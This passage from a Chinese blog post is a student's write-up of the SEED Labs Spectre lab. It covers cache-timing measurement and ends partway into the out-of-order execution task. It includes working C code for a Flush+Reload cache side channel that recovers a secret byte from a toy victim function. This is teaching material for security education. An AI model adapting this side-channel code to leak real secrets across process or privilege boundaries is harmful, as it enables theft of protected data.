<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SEEDLAB：幽灵攻击实验 | Enboy_Yu's blog</title><meta name="keywords" content="seedlab 幽灵攻击"><meta name="author" content="Enboy_Yu"><meta name="copyright" content="Enboy_Yu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、    实验目的 1 overview幽灵攻击于2017年发现并于2018年1月公开披露，利用了许多现代处理器中存在的关键漏洞，包括英特尔、AMD和ARM 处理器的漏洞。这些漏洞允许程序打破进程间和进程内的隔离，因此恶意程序可以从其无法访问的区域读取数据。硬件保护机制（用于进程间隔离）或软件保护机制（用于进程内隔离）不允许这种访问，但是cpu的设计中存在漏洞，有可能破坏保护。因为缺陷存在于硬">
<meta property="og:type" content="article">
<meta property="og:title" content="SEEDLAB：幽灵攻击实验">
<meta property="og:url" content="https://02lxc.github.io/post/f52b3abf.html">
<meta property="og:site_name" content="Enboy_Yu&#39;s blog">
<meta property="og:description" content="一、    实验目的 1 overview幽灵攻击于2017年发现并于2018年1月公开披露，利用了许多现代处理器中存在的关键漏洞，包括英特尔、AMD和ARM 处理器的漏洞。这些漏洞允许程序打破进程间和进程内的隔离，因此恶意程序可以从其无法访问的区域读取数据。硬件保护机制（用于进程间隔离）或软件保护机制（用于进程内隔离）不允许这种访问，但是cpu的设计中存在漏洞，有可能破坏保护。因为缺陷存在于硬">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&h=187&c=7&r=0&o=5&dpr=1.6&pid=1.7">
<meta property="article:published_time" content="2024-01-31T06:12:11.281Z">
<meta property="article:modified_time" content="2024-01-31T09:02:56.689Z">
<meta property="article:author" content="Enboy_Yu">
<meta property="article:tag" content="seedlab 幽灵攻击">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&h=187&c=7&r=0&o=5&dpr=1.6&pid=1.7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://02lxc.github.io/post/f52b3abf"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-31 17:02:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="C:\blog-demo\node_modules\hexo-theme-butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Enboy_Yu's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SEEDLAB：幽灵攻击实验</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-31T06:12:11.281Z" title="发表于 2024-01-31 14:12:11">2024-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-31T09:02:56.689Z" title="更新于 2024-01-31 17:02:56">2024-01-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/seedlab/">seedlab</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SEEDLAB：幽灵攻击实验"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a name="cIZ0i"></a></p>
<h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p>
<h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>幽灵攻击于2017年发现并于2018年1月公开披露，利用了许多现代处理器中存在的关键漏洞，包括英特尔、AMD和ARM 处理器的漏洞。这些漏洞允许程序打破进程间和进程内的隔离，因此恶意程序可以从其无法访问的区域读取数据。硬件保护机制（用于进程间隔离）或软件保护机制（用于进程内隔离）不允许这种访问，但是cpu的设计中存在漏洞，有可能破坏保护。因为缺陷存在于硬件中，所以很难从根本上解决这个问题，除非我们从计算机上的cpu。幽灵漏洞代表了cpu设计中一种特殊的漏洞类型。除了崩溃漏洞之外，它们还为安全教育提供了宝贵的教训。<br />本实验室的学习目标是让学生获得关于幽灵攻击的第一手经验。攻击本身非常复杂，所以我们将其分解为几个小步骤，每个步骤都很容易理解和执行。一旦学生理解了每一步，他们就不难把所有的东西放在一起来执行实际的攻击。本实验室涵盖了以下所描述的一些主题：</p>
<ul>
<li>幽灵攻击</li>
<li>侧通道攻击</li>
<li>CPU缓存</li>
<li>在CPU微架构内的无序执行和分支预测<br><a name="vg0k9"></a></li>
</ul>
<h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="sVEWg"></a></p>
<h2 id="2-Code-Compilation"><a href="#2-Code-Compilation" class="headerlink" title="2 Code Compilation"></a><strong>2 Code Compilation</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myprog myprog.c</span><br></pre></td></tr></table></figure>

<p><a name="eOgml"></a></p>
<h2 id="3-Tasks-1-and-2-Side-Channel-Attacks-via-CPU-Caches"><a href="#3-Tasks-1-and-2-Side-Channel-Attacks-via-CPU-Caches" class="headerlink" title="3 Tasks 1 and 2: Side Channel Attacks via CPU Caches"></a>3 <strong>Tasks 1 and 2: Side Channel Attacks via CPU Caches</strong></h2><ul>
<li>崩溃和幽灵攻击都使用CPU缓存作为一个侧通道来窃取一个受保护的秘密。在这种侧通道攻击中使用的技术称为刷新+重加载。我们将首先研究这项技术。在这两个任务中开发的代码将在以后的任务中用作构建块。</li>
<li>CPU缓存是计算机的CPU用来降低从主缓存访问数据的平均成本（时间或能量）的硬件缓存。从CPU高速缓存访问数据比从主存储器访问数据要快得多。当数据从主存器获取时，通常由CPU缓存，所以如果再次使用相同的数据，访问时间会快得多。</li>
<li>因此，当CPU需要访问某些数据时，它首先查看其缓存。如果数据（这称为缓存命中），将直接从那里获取。如果数据不存在（这称为错过），CPU将进入主存获取数据。在后一种情况下所花费的时间要长得多。大多数现代cpu都有CPU缓存。<br><a name="sHTt4"></a></li>
</ul>
<h3 id="3-1-Task-1-Reading-from-Cache-versus-from-Memory"><a href="#3-1-Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="3.1 Task 1: Reading from Cache versus from Memory"></a><strong>3.1 Task 1: Reading from Cache versus from Memory</strong></h3><ul>
<li><p>缓存内存用于以更快的速度向高速处理器提供数据。与主存相比，缓存内存非常快。让我们看看时间差。</p>
</li>
<li><p>在下面的代码(CacheTime.c)中，我们有一个大小为10<em>4096的数组。我们首先访问它的两个元素，数组[3</em>4096]和数组[7*4096]。因此，包含这两个元素的页面将被缓存。</p>
</li>
<li><p>然后，我们从数组[04096]读取元素到数组[94096]，并测量3在内存读取中所花费的时间。在代码中，行➀在内存读取前读取CPU的时间戳(TSC)计数器，而行➁在内存读取后读取计数器。它们的区别在于在内存读取中花费的时间（按CPU周期数）。需要注意的是，<strong>缓存是在缓存块级别完成的，而不是在字节级别</strong>。一个典型的高速缓存块大小为64字节。我们使用数组[k*4096]，因此程序中使用的两个元素不属于同一个缓存块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">10</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Initialize the array</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span>]=<span class="number">1</span>;</span><br><span class="line">  <span class="comment">// FLUSH the array from the CPU cache</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span>]);</span><br><span class="line">  <span class="comment">// Access some of the array items</span></span><br><span class="line">  <span class="built_in">array</span>[<span class="number">3</span>*<span class="number">4096</span>] = <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span>*<span class="number">4096</span>] = <span class="number">200</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span>];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);   junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Access time for array[%d*4096]: %d CPU cycles\n&quot;</span>,i, (<span class="type">int</span>)time2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>程序解读：</p>
</li>
<li><p>time1,time2因为是频繁操作，又不用取地址，适合用寄存器变量</p>
</li>
<li><p>读操作远大于写操作时，用volatile可以避免加锁，故addr适合定义成volatile_mm_clflush这个函数调用一下，确保没有被CPU缓存</p>
</li>
<li><p>time1 &#x3D; __rdtscp(&amp;junk); 表示读取junk到内存，并返回TSC</p>
</li>
<li><p>请使用<strong>gcc -march&#x3D;native CacheTime.c</strong>编译以下代码，并运行它。数组[3_4096]和数组[7_4096]的访问速度是否比其他元素更快？您应该运行该程序至少10次，并描述您的观察结果。从实验中，您需要找到一个阈值，可用于区分这两种类型的内存访问：从缓存访问数据和从主存访问数据。这个阈值对于这个实验室的其他任务都很重要。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native CacheTime.c</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702472944391-f1d0e465-822e-4fea-8871-de36c2b2eb91.png#averageHue=%2313110f&clientId=uf8fdb3e2-6fa1-4&from=paste&height=147&id=uf6ebb151&originHeight=232&originWidth=1060&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66963&status=done&style=none&taskId=u59bdc57d-8f4d-4238-b8fa-b3c5e4a4e20&title=&width=673.0159035795864" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702472972630-aa2c9377-21b7-4460-9c5a-711b4affd76d.png#averageHue=%2314100d&clientId=uf8fdb3e2-6fa1-4&from=paste&height=367&id=ucfd35819&originHeight=578&originWidth=687&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=183706&status=done&style=none&taskId=uce43cb52-e104-45ca-bc68-0144555c2bb&title=&width=436.19049599922255" alt="image.png"><br />运行10次后观察发现，阈值应该为64<br><a name="uHSqp"></a></p>
</li>
</ul>
<h3 id="3-2-Task-2-Using-Cache-as-a-Side-Channel"><a href="#3-2-Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="3.2 Task 2: Using Cache as a Side Channel"></a><strong>3.2 Task 2: Using Cache as a Side Channel</strong></h3><p>该任务的目的是使用侧通道来提取受害者函数所使用的秘密值。假设有一个受害者函数，它使用一个秘密值作为索引来从数组中加载一些值。还假设秘密值不能从外部访问。我们的目标是使用侧边通道来获得这个秘密的价值。我们将使用的技术被称为刷新+重加载。图2说明了该技术，它包括三个步骤<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702473158253-5fcd9d80-155c-4450-b8ab-ce83fa3f5cf8.png#averageHue=%23f3f2f2&clientId=uf8fdb3e2-6fa1-4&from=paste&height=250&id=u01078bb3&originHeight=730&originWidth=1668&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=164606&status=done&style=none&taskId=u385448ea-f7f6-4e3b-b615-87730367421&title=&width=571.4603271484375" alt="image.png"></p>
<ul>
<li>1.从缓存内存中刷新整个阵列，以确保该阵列没有被缓存。</li>
<li>2.调用受害者函数，该函数根据秘密的值访问其中一个数组元素。此操作将导致高速缓存相应的数组元素。</li>
<li>3.重新加载整个数组，并测量重新加载每个元素所需的时间。如果一个特定元素的加载时间快，很可能元素已经在缓存中。该元素必须是受害者函数所访问的元素。因此，我们可以弄清楚秘密值是什么。下面的程序使用刷新+重加载技术来找出变量秘密中包含的单字节秘密值。由于一个字节秘密有256个可能的值，因此我们需要将每个值映射到一个数组元素。最简单的方法是定义一个由256个元素组成的数组（即数组[256]）。然而，这并不起作用。缓存是在块级别上完成的，而不是在字节级别上完成的。如果访问数组[k]，则将缓存包含此元素的内存块。因此，数组[k]的相邻元素也将被缓存，这使得很难推断出秘密是什么。为了解决这个问题，我们创建了一个包含256<em>4096字节的数组。在我们的重新加载步骤中使用的每个元素都是数组[k</em>4096]。因为4096大于一个典型的缓存块大小（64字节），所以没有两个不同的元素数组[i<em>4096]和数组[j</em>4096]将在同一个缓存块中。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="type">int</span> temp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> secret = <span class="number">94</span>;</span><br><span class="line"><span class="comment">/* cache hit time threshold assumed*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Flush the values of the array from cache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    temp = <span class="built_in">array</span>[secret*<span class="number">4096</span> + DELTA];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">        time1 = __rdtscp(&amp;junk);</span><br><span class="line">        junk = *addr;</span><br><span class="line">        time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">        <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>,i);&#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    flushSideChannel();</span><br><span class="line">    victim();</span><br><span class="line">    reloadSideChannel();</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>程序设定了一个阈值，当时间小于这个阈值，说明被CPU缓存了，这时这个值肯定是调用victim函数的那个值，可以把该值读取出来。</li>
<li>乘4096只是为了把cache块隔开，4096大于一个典型的64字节的内存块</li>
<li>由于缓存是块级缓存的，故不能简单定义array[256]</li>
<li>请使用Gcc编译程序并运行。需要注意的是，该技术并不是100%准确的，而且您可能无法一直观察到预期的输出。运行该程序至少20次，并计算出您将正确获得该秘密的次数。还可以将缓存HIT阈值调整为来自任务1的阈值（此代码中使用80）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native -o FlushReload FlushReload.c</span><br></pre></td></tr></table></figure>
<p>不知是不是amd芯片原因，运行20次后，发现并无明显变化：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702473952719-b2af6a8e-dc15-4c9d-bd12-c7f85c40bb2c.png#averageHue=%230e0b09&clientId=uf8fdb3e2-6fa1-4&from=paste&height=397&id=u432555a1&originHeight=626&originWidth=572&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=114637&status=done&style=none&taskId=u4b394937-4987-4d23-9d26-08ed3a0d264&title=&width=363.17461966747493" alt="image.png"><br><a name="Wx78V"></a></p>
<h2 id="4-Task-3-Out-of-Order-Execution-and-Branch-Prediction"><a href="#4-Task-3-Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="4 Task 3: Out-of-Order Execution and Branch Prediction"></a><strong>4 Task 3: Out-of-Order Execution and Branch Prediction</strong></h2><blockquote>
<p>这个任务的目的是了解cpu中的无序执行。我们将用一个实验来帮助学生观察这种执行方式。</p>
</blockquote>
<p><a name="Aje8Z"></a></p>
<h3 id="4-1-Out-Of-Order-Execution"><a href="#4-1-Out-Of-Order-Execution" class="headerlink" title="4.1 Out-Of-Order Execution"></a><strong>4.1 Out-Of-Order Execution</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (x &lt; size) &#123;</span><br><span class="line">data = data + <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>关于上述代码示例的陈述在从CPU外部观察时是正确的。然而，如果我们深入到CPU内部、从微架构层面观察执行序列，这个陈述就不完全正确了。如果我们这样做，我们会发现即使x的值大于size，第3行可能会成功执行。这是由于现代CPU采用的一种重要的优化技术，称为乱序执行。</li>
<li>乱序执行是一种优化技术，允许CPU最大限度地利用其所有执行单元。CPU不再严格按照顺序处理指令，而是在所有必需的资源可用时立即并行执行它们。当当前操作的执行单元被占用时，其他执行单元可以提前运行。</li>
